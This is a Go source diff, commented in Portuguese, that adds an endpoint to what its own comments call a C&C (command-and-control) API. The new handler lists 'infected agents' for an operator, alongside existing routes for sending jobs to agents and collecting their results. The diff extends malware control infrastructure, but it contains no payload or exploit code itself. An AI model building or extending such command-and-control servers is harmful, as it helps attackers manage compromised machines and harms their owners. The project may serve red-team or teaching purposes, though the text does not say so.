@@ -31,6 +31,7 @@ type Repository interface {
 	GetJob(id string) (domain.JobRow, error) 
 	UpdateJob(job domain.JobRow) error
 	GetAllJobs() ([]domain.JobRow, error) 
+	GetAllAgents() ([]domain.AgentRow, error)
 }
 
 // ServerHTTP é a nossa API C&C
@@ -54,6 +55,7 @@ func (s *ServerHTTP) Router() http.Handler {
 	mux.HandleFunc("POST /api/jobs/result", s.handleReceiveJobResult)
 	mux.HandleFunc("GET /api/jobs", s.handleSendAllJobResults)
 	mux.HandleFunc("GET /api/jobs/{job_id}/result", s.handleSendJobResult)
+	mux.HandleFunc("GET /api/agents", s.handleSendAvailableAgents)
 	return mux
 }
 
@@ -207,6 +209,27 @@ func (s *ServerHTTP) handleSendJobResult(w http.ResponseWriter, r *http.Request)
 	// Desreferenciamos o ponteiro de String com segurança, se o Agente já tiver respondido
 	if job.Output != nil {
 		response["output"] = *job.Output
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	w.WriteHeader(http.StatusOK)
+	json.NewEncoder(w).Encode(response)
+}
+
+// handleSendAvailableAgents lista todos os agentes infectados para o Operador
+func (s *ServerHTTP) handleSendAvailableAgents(w http.ResponseWriter, r *http.Request) {
+	agents, err := s.repo.GetAllAgents()
+	if err != nil {
+		http.Error(w, "Erro ao buscar agentes", http.StatusInternalServerError)
+		return
+	}
+
+	// Transformamos as Entidades em JSON (Array de DTOs)
+	var response []map[string]interface{}
+	for _, a := range agents {
+		response = append(response, map[string]interface{}{
+			"id": a.UUID,
+		})
 	}
 
 	w.Header().Set("Content-Type", "application/json")
